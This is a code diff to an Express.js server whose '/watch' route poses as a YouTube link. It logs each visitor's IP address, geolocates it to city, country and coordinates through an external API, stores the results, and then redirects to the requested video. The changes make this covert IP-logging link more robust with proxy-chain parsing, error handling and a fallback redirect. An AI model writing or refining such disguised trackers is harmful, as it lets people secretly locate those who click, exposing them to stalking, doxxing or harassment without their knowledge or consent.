@@ -28,8 +28,11 @@ app.get('/watch', async (req, res) => {
     try {
         const videoId = req.query.v;
         
-        // Get real IP
+        // Get real IP and clean it
         let ip = req.realIp.replace('::ffff:', '');
+        // Extract first IP if multiple are present (from proxy chain)
+        ip = ip.split(',')[0].trim();
+        
         console.log('\x1b[36m%s\x1b[0m', `New visit from IP: ${ip}`);
 
         // Pour les tests locaux, utilisons une IP publique fictive
@@ -38,37 +41,42 @@ app.get('/watch', async (req, res) => {
             console.log('\x1b[33m%s\x1b[0m', `Local IP detected, using test IP: ${ip}`);
         }
 
-        // Get IP info
-        const ipInfo = await axios.get(`http://ip-api.com/json/${ip}`);
-        
-        if (ipInfo.data.status === 'success') {
-            console.log('\x1b[32m%s\x1b[0m', `Location found: ${ipInfo.data.city}, ${ipInfo.data.country}`);
+        try {
+            // Get IP info with cleaned IP
+            const ipInfo = await axios.get(`http://ip-api.com/json/${ip}`);
             
-            // Extract first IP if multiple are present
-            const cleanIp = ip.split(',')[0].trim();
-            
-            // Store in memory
-            trackedIPs.push({
-                ip: cleanIp,
-                country: ipInfo.data.country,
-                city: ipInfo.data.city,
-                latitude: ipInfo.data.lat,
-                longitude: ipInfo.data.lon,
-                timestamp: new Date().toISOString()
-            });
+            if (ipInfo.data.status === 'success') {
+                console.log('\x1b[32m%s\x1b[0m', `Location found: ${ipInfo.data.city}, ${ipInfo.data.country}`);
+                
+                // Store in memory
+                trackedIPs.push({
+                    ip: ip,
+                    country: ipInfo.data.country,
+                    city: ipInfo.data.city,
+                    latitude: ipInfo.data.lat,
+                    longitude: ipInfo.data.lon,
+                    timestamp: new Date().toISOString()
+                });
 
-            console.log('\x1b[32m%s\x1b[0m', `IP data stored successfully. Total IPs: ${trackedIPs.length}`);
+                console.log('\x1b[32m%s\x1b[0m', `IP data stored successfully. Total IPs: ${trackedIPs.length}`);
 
-            // Keep only last 100 IPs to manage memory
-            if (trackedIPs.length > 100) {
-                trackedIPs = trackedIPs.slice(-100);
+                // Keep only last 100 IPs to manage memory
+                if (trackedIPs.length > 100) {
+                    trackedIPs = trackedIPs.slice(-100);
+                }
+            } else {
+                console.error('\x1b[31m%s\x1b[0m', `IP API returned error status: ${ipInfo.data.message}`);
             }
-        } else {
-            console.error('\x1b[31m%s\x1b[0m', `IP API returned error status: ${ipInfo.data.message}`);
+        } catch (apiError) {
+            console.error('\x1b[31m%s\x1b[0m', `Error calling IP API: ${apiError.message}`);
         }
 
         // Redirect to actual YouTube video
-        res.redirect(`https://youtube.com/watch?v=${videoId}`);
+        if (videoId) {
+            res.redirect(`https://youtube.com/watch?v=${videoId}`);
+        } else {
+            res.redirect('https://youtube.com');
+        }
 
     } catch (error) {
         console.error('\x1b[31m%s\x1b[0m', `Error processing request: ${error}`);
